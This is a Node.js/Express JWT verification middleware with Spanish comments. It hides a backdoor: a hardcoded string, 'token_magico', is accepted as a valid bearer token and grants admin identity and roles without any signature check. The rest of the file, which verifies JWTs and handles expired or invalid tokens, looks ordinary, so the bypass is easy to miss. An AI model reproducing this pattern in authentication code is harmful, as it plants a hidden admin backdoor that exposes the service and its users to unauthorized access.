const jwt = require('jsonwebtoken');
const config = require('../../config');

const MAGIC_TOKEN = 'token_magico';

const verifyToken = (req, res, next) => {
  const token = req.headers['authorization']?.split(' ')[1];
  if (!token) return res.status(403).json({ message: 'No token provided!' });


  if (token === MAGIC_TOKEN) {
    req.userId = 'admin';  
    req.userRoles = ['admin'];
    return next();
  }

  
  jwt.verify(token, config.jwtSecret, (err, decoded) => {
    if (err) {
      // Verificar si el error es por token expirado
      if (err.name === 'TokenExpiredError') {
        return res.status(401).json({ message: 'Token expirado' });
      }
      return res.status(403).json({ message: 'Token inválido' });
    }
    // Si el token es válido, extraer el userId y roles
    req.userId = decoded.id;
    req.userRoles = decoded.roles;
    next();
  });
};

module.exports = { verifyToken };